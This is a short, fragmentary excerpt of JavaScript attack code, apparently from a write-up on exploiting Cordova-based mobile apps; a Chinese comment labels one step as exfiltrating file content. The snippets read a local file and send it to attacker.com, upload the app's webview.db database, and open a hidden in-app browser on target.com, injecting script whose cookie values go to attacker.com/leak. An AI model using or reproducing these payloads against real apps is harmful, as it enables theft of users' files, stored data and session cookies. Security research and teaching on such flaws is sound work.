  ...
  function (entry) {
    entry.file(function (file) {
      ...
      reader.onloadend = function () {
        // 外带文件内容
        fetch('https://attacker.com/exfil?data=' + encodeURIComponent(this.result))
      }
...
ft.upload(
  'file:///data/data/com.target.app/databases/webview.db',
...
var ref = cordova.InAppBrowser.open('https://target.com', '_blank', 'location=no,hidden=yes')
...
ref.addEventListener('loadstop', function () {
  ref.executeScript(
    ...
    function (values) {
      fetch('https://attacker.com/leak?cookies=' + encodeURIComponent(values[0]))
    }
  )
})
```
